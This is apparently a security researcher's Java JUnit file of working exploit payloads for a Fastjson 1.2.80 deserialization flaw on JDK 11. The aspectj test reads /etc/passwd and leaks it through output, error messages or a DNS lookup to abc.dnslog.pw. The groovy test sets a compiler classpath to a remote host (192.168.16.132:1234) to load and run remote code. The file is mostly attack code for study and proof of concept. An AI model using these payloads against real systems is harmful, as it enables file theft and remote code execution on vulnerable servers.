package com.example.fastjson_1_2_80_jdk11;

import com.alibaba.fastjson.JSON;
import org.junit.jupiter.api.Test;

/**
 * @author Whoopsunix
 */

public class fastjson_1_2_80_jdk11 {

    // 三步打模拟，web项目可利用
    @Test
    public void aspectj() {
        String payload1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
                "}";
        String payload2 = "{\n" +
                "    \"@type\":\"java.lang.Class\",\n" +
                "    \"val\":{\n" +
                "        \"@type\":\"java.lang.String\"{\n" +
                "        \"@type\":\"java.util.Locale\",\n" +
                "        \"val\":{\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",{\n" +
                "                \"@type\":\"java.lang.String\"\n" +
                "                \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\n" +
                "                \"newAnnotationProcessorUnits\":[{}]\n" +
                "            }\n" +
                "        }\n" +
                "    }";

        // 回显
        String payload3 = "{\n" +
                "    \"x\":{\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
                "        \"fileName\":\"/etc/passwd\"\n" +
                "    }\n" +
                "}";

        //报错回显
        payload3 = "{\n" +
                "  \"@type\": \"java.lang.Character\" {\n" +
                "    \"C\": {\n" +
                "      \"x\": {\n" +
                "        \"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
                "        \"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
                "        \"fileName\": \"/etc/passwd\"\n" +
                "      }\n" +
                "    }\n" +
                "  }\n" +
                "}";

        // dnslog
        payload3 = "{\r\n"
                + "    \"@type\":\"java.net.Inet4Address\",\r\n"
                + "    \"val\":{\r\n"
                + "        \"@type\":\"java.lang.String\"{\r\n"
                + "        \"@type\":\"java.util.Locale\",\r\n"
                + "        \"val\":{\r\n"
                + "            \"@type\":\"com.alibaba.fastjson.JSONObject\",{\r\n"
                + "                \"@type\":\"java.lang.String\"\r\n"
                + "                \"@type\":\"java.util.Locale\",\r\n"
                + "                \"country\":\"abc.dnslog.pw\",\r\n"
                + "                \"language\":{\r\n"
                + "                    \"@type\":\"java.lang.String\"{\r\n"
                + "                    \"x\":{\r\n"
                + "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
                + "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
                + "				\"fileName\": \"/etc/passwd\"\r\n"
                + "			}\r\n"
                + "                }\r\n"
                + "            }\r\n"
                + "        }\r\n"
                + "    }\r\n"
                + "  }\r\n"
                + "}\r\n"
                + "}\r\n"
                + "\r\n"
                + "\r\n"
                + "\r\n"
                + "";


        JSON.parseObject(payload1);
        try {
            JSON.parseObject(payload2);
        } catch (Exception e) {
        }
        System.out.println(JSON.parseObject(payload3));
    }

    @Test
    public void groovy() {
        String payload1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "    \"unit\":{}\n" +
                "}";
        String payload2 = "{\n" +
                "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "    \"config\":{\n" +
                "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "        \"classpathList\":\"http://192.168.16.132:1234/\"\n" +
                "    }\n" +
                "}";

        try {
            JSON.parse(payload1);
        } catch (Exception e) {
        }
        JSON.parse(payload2);
    }
}
